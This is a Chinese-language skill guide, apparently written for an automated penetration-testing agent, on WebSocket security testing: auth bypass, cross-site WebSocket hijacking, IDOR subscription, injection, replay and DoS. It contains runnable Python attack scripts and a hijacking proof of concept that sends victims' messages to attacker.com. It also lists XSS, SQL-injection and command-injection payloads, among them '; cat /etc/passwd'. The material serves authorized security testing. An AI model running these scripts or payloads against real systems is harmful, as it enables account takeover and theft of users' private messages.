---
name: websocket-test
description: >
  WebSocket 安全测试。覆盖认证绕过（握手后换 token）、Cross-Site WebSocket
  Hijacking (CSWSH)、越权订阅（篡改 channel/room ID）、消息注入攻击、
  WebSocket 重放攻击、连接耗尽 DoS。从 JS 中搜索 ws:// / wss:// / new WebSocket
  定位端点。
metadata:
  tags: "websocket,ws,cswsh,authentication,authorization,injection,replay"
  category: "offensive-security"
---

# WebSocket Security Testing

> 现代应用大量用 WebSocket 做实时通信（消息、通知、协作编辑、交易推送）。
> JS 分析阶段搜索 `new WebSocket(` `ws://` `wss://` 定位所有 WS 端点。

---

## ⛔ 强制规则

```
规则 1: 从 JS 中定位所有 WS 端点（new WebSocket / ws:// / wss://）
规则 2: 每个 WS 端点至少测试认证和越权
规则 3: WS 测试只用自己的测试账号
规则 4: 不允许批量接收/监听他人实时消息（限于证明越权原则 ≤5 条）
```

---

## 0. JS 中定位 WebSocket 端点

```
在 JS 文件中搜索:
  □ new WebSocket(           → 直接创建连接
  □ io(                      → Socket.IO 客户端
  □ ws://                    → 明文连接（可中间人）
  □ wss://                   → 加密连接
  □ socket.emit(             → Socket.IO 发送事件
  □ socket.on(               → Socket.IO 接收事件
  □ .subscribe(              → STOMP/RxJS 订阅
  □ Stomp.client(            → STOMP over WebSocket
```

---

## 1. WebSocket 端点发现

```bash
# 从 JS 文件中 grep WebSocket 连接
grep -rn "new WebSocket\|ws://\|wss://\|io(\|socket.emit\|\.subscribe\|Stomp" \
  downloaded/${TARGET}/js/ > ws_endpoints_raw.txt

# Socket.IO 常见路径
# /socket.io/?EIO=3&transport=websocket
# /socket.io/?EIO=4&transport=websocket

# 手动探测 WS 端点
curl "https://target/socket.io/?EIO=4&transport=polling" \
  -H "Origin: https://target" 
# → 返回 sid → 用于后续 WS 连接
```

---

## 2. 认证绕过测试

**核心问题**：WebSocket 通常只在连接握手时验证 token（HTTP Upgrade 请求）。一旦连接建立，后续消息不再验证身份。

### 2a. 握手后换 Token

```
Step 1: 用合法 token 建立 WS 连接
Step 2: 发送业务消息 → 确认认证有效
Step 3: 发送一个"切换用户"的消息 → 如果 WS 服务端不重新验证 →
        后续消息以新身份处理
```

```python
# ws_auth_bypass.py
import asyncio, websockets, json

async def test_auth_hijack():
    uri = "wss://target.com/ws"
    
    # 用用户A的token连接
    async with websockets.connect(uri, extra_headers={
        "Authorization": "Bearer <token_user_A>"
    }) as ws:
        # 发送身份切换消息
        await ws.send(json.dumps({
            "type": "auth",
            "token": "<token_user_B>",  # 切换为用户B
            "userId": 10087
        }))
        
        # 发一个需要认证的消息
        await ws.send(json.dumps({
            "type": "get_messages",
            "userId": 10087
        }))
        
        response = await ws.recv()
        # 如果返回了用户B的消息 → 认证绕过
        print(f"Response: {response}")

asyncio.run(test_auth_hijack())
```

### 2b. 握手时不认证，消息中认证

```
如果 WS 连接建立时不需要 token，只能靠消息体中的 token 区分用户:

Step 1: 无 token 建立 WS 连接
Step 2: 发消息时不带 token → 如果服务端处理了 → 完全无认证
Step 3: 篡改消息中的 userId → 如果服务端信任客户端提供的 userId → 越权
```

---

## 3. Cross-Site WebSocket Hijacking (CSWSH)

**攻击逻辑**：如果 WS 服务端不检查 Origin 头 → 攻击者网站可以通过 JavaScript 连接到受害者的 WS 端点 → 当受害者访问攻击者网站时 →浏览器的 cookie 自动带上 → WS 连接以受害者身份建立。

### 检测方法

```bash
# 检查 Origin 头是否被验证
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Origin: https://attacker.com" \
  -H "Cookie: session=..." \
  "https://target/ws"
# 如果返回 101 Switching Protocols → CSWSH 漏洞
```

### 利用 PoC

```html
<!-- cswsh_poc.html — 托管在 attacker.com -->
<script>
  // 受害者访问此页面时，浏览器自动带上 target.com 的 cookie
  var ws = new WebSocket('wss://target.com/ws');
  ws.onopen = function() {
    ws.send(JSON.stringify({type: "get_messages"}));
  };
  ws.onmessage = function(event) {
    // 拿到受害者的实时消息 → 发到攻击者服务器
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(event.data));
  };
</script>
```

---

## 4. 越权订阅（最常见 WS 漏洞）

**攻击逻辑**：修改 WebSocket 消息中的 channel/room/conversation ID → 接收他人的实时消息。

```
常见越权场景:
  □ 聊天: 修改 roomId 加入他人私聊
  □ 通知: 修改 userId 接收他人通知
  □ 交易: 修改 accountId 接收他人交易推送
  □ 协作: 修改 docId 接收他人协作编辑内容
```

```python
# ws_idor.py — 越权订阅测试
import asyncio, websockets, json

async def test_subscription_idor():
    # 用合法token连接
    async with websockets.connect(
        "wss://target.com/ws",
        extra_headers={"Authorization": "Bearer <token>"}
    ) as ws:
        # 正常订阅自己的消息
        await ws.send(json.dumps({
            "action": "subscribe",
            "channel": "user_10086_messages"
        }))
        normal_msg = await ws.recv()
        print(f"Normal: {normal_msg}")
        
        # 越权：订阅另一个用户的消息
        await ws.send(json.dumps({
            "action": "subscribe", 
            "channel": "user_10087_messages"  # 他人的 channel
        }))
        idor_msg = await ws.recv()
        print(f"IDOR attempt: {idor_msg}")
        # 如果收到了 10087 的消息 → 越权订阅漏洞

asyncio.run(test_subscription_idor())
```

---

## 5. 消息注入攻击

**如果 WS 消息被拼接到 HTML / SQL / 命令行中**：

```
XSS via WebSocket:
  → {"message": "<img src=x onerror='alert(1)'>"}
  
SQLi via WebSocket:
  → {"query": "' OR '1'='1"}
  
命令注入 via WebSocket:
  → {"filename": "; cat /etc/passwd"}
```

---

## 6. WebSocket 重放攻击

```
Step 1: 用 Burp/Proxifier 捕获 WS 消息
Step 2: 重放"创建订单"、"发送消息"等消息
Step 3: 如果服务端没有防重放机制 → 重复执行
```

```python
# ws_replay.py
import asyncio, websockets, json

async def replay():
    captured_messages = [
        '{"type":"create_order","productId":"SKU123","quantity":1}',
    ]
    
    async with websockets.connect("wss://target.com/ws") as ws:
        for msg in captured_messages:
            for i in range(5):  # 重放5次
                await ws.send(msg)
                resp = await ws.recv()
                if "success" in resp:
                    print(f"[!] 重放成功: {i+1}")
        await asyncio.sleep(1)

asyncio.run(replay())
```

---

## 7. 连接耗尽 DoS

```
攻击逻辑: 建立大量 WS 连接但不发送数据 → 耗尽服务端连接池。

注意: 仅用于测试，建立 ≤ 100 个连接即可验证问题。
```

---

## 8. 测试检查清单

```
□ JS 分析阶段:
  □ 搜索 new WebSocket / ws:// / wss:// / io(
  □ 搜索 socket.emit / socket.on（Socket.IO）
  □ 搜索 Stomp.client / .subscribe（STOMP）
  □ 提取所有 WS 端点 URL + 鉴权方式

□ 认证测试:
  □ 无 token 建立连接 → 能收消息？
  □ 握手后换 token → 身份切换生效？
  □ 消息中篡改 userId → 越权？

□ 越权测试:
  □ 修改 channel/room/conversation ID → 收到他人消息？
  □ 修改 subscribe 参数 → 订阅他人通知？

□ CSWSH:
  □ 不同 Origin → 是否返回 101？
  □ 如果返回 101 → 验证浏览器 cookie 是否自动带上

□ 重放:
  □ 重用已发送的消息 → 是否被服务端接受？

□ 注入:
  □ 消息内容 <img src=x onerror=...> → DOM XSS？
  □ 特殊字符 → 后端异常？
```

---

## 9. 输出

```
findings/
├── ws_endpoints.txt           # 所有 WS 端点
├── ws_auth_results.md         # 认证测试结果
├── ws_idor_results.md         # 越权测试结果
├── ws_cswsh_results.md        # CSWSH 测试结果
└── poc/
    ├── ws_auth_bypass.py
    ├── ws_idor.py
    └── ws_replay.py
```
